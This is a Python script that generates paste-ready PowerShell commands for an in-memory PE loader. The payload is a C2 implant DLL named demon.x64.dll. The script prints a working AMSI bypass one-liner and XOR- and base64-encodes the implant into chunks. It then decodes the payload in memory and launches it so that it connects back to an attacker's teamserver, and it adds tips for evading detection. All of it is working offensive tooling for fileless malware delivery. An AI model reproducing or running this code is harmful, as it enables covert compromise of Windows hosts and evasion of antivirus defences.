#!/usr/bin/env python3
"""
Generate paste-ready PowerShell commands for the in-memory PE loader.
Splits the base64 payload into chunks that can be pasted one at a time.
Each chunk appends to $raw so the full payload is assembled in memory.

Usage:
    python3 gen_paste.py va     # VirtualAlloc loader (loader_va.ps1)
    python3 gen_paste.py nt     # NtCreateSection loader (loader_nt.ps1)

Output: paste commands printed to stdout (copy/paste into terminal)
"""
import sys, os, base64

mode = sys.argv[1] if len(sys.argv) > 1 else 'va'

dll_path = os.path.join(os.path.dirname(__file__), '..', 'demon.x64.dll')
xor_key = 0xD3

dll_bytes = open(dll_path, 'rb').read()
enc = bytes([b ^ xor_key for b in dll_bytes])
b64 = base64.b64encode(enc).decode()

CHUNK = 40000  # safe chunk size for terminal paste
chunks = [b64[i:i+CHUNK] for i in range(0, len(b64), CHUNK)]

cls = 'KL2' if mode == 'nt' else 'KL'
loader_file = 'loader_nt.ps1' if mode == 'nt' else 'loader_va.ps1'

print("=" * 72)
print(f"PASTE SEQUENCE FOR {mode.upper()} LOADER — {len(b64)} chars, {len(chunks)} chunks")
print("=" * 72)
print()

print("### PASTE 1: AMSI bypass (paste this line FIRST, alone) ###")
print("$q='amsi'+'Con'+'text';[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetField($q,'NonPublic,Static').SetValue($null,0)}")
print()

# Read the loader PS1 file
loader_src = open(os.path.join(os.path.dirname(__file__), loader_file)).read()
# Extract just the Add-Type -Language block (skip commented lines)
start = loader_src.find('Add-Type -Language CSharp')
end = loader_src.find('"@', start) + 2
add_type_block = loader_src[start:end]

print("### PASTE 2: Add-Type C# loader (paste after AMSI bypass) ###")
print(add_type_block)
print()

print("### PASTE 3: Assemble payload in memory (paste each chunk separately) ###")
print("$raw=''")
for i, chunk in enumerate(chunks):
    print(f"$raw+='{chunk}'")
print()

print("### PASTE 4: XOR-decode the payload ###")
print(f"$b=[Convert]::FromBase64String($raw)")
print(f"$d=New-Object Byte[] $b.Length;for($i=0;$i-lt$b.Length;$i++){{$d[$i]=$b[$i]-bxor0x{xor_key:02X}}}")
print()

print("### PASTE 5: Load in memory and connect to C2 ###")
print(f"[{cls}]::Go($d)")
print()

print("=" * 72)
print(f"Total pastes: {5 + len(chunks) - 1} (AMSI + AddType + {len(chunks)} chunks + decode + execute)")
print(f"After PASTE 5, watch the teamserver for a new agent session.")
print()
print("TIP: If Add-Type block is flagged, try pasting line by line.")
print("TIP: If VirtualAlloc approach fails, try the NtCreateSection loader:")
print(f"     python3 gen_paste.py nt")
